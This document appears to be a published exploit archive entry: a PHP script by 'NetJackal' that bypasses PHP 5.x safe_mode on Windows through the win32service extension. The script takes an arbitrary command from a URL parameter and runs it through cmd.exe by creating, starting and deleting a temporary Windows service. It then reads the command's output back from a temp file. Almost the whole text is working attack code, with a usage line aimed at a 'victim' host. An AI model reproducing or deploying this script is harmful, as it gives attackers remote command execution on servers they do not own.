PHP 5.x (win32service) Local Safe Mode Bypass Exploit
=====================================================



<?php

#####################################################
### PHP Safe_mode bypass exploit (win32service)   ###
###                                               ###
### Note: Tested on 5.2.1                         ###
###                                               ###
### Author:  NetJackal                            ###
### Email:   nima_501[at]yahoo[dot]com            ###
### Website: http://netjackal.by.ru               ###
###                                               ###
###                                               ###
### Usage: http://victim.net/nj.php?CMD=[command] ###
#####################################################

$command=(isset($_GET[&#039;CMD&#039;]))?$_GET[&#039;CMD&#039;]:&#039;dir&#039;; #cammand
$dir=ini_get(&#039;upload_tmp_dir&#039;); #Directory to store command&#039;s output

if(!extension_loaded(&#039;win32service&#039;))die(&#039;win32service extension not found!&#039;);
$name=$dir."\\".uniqid(&#039;NJ&#039;);
$n=uniqid(&#039;NJ&#039;);
$cmd=(empty($_SERVER[&#039;ComSpec&#039;]))?&#039;d:\\windows\\system32\\cmd.exe&#039;:$_SERVER[&#039;ComSpec&#039;];
win32_create_service(array(&#039;service&#039;=>$n,&#039;display&#039;=>$n,&#039;path&#039;=>$cmd,&#039;params&#039;=>"/c $command >\"$name\""));
win32_start_service($n);
win32_stop_service($n);
win32_delete_service($n);
$exec=file_get_contents($name);
unlink($name);
?>



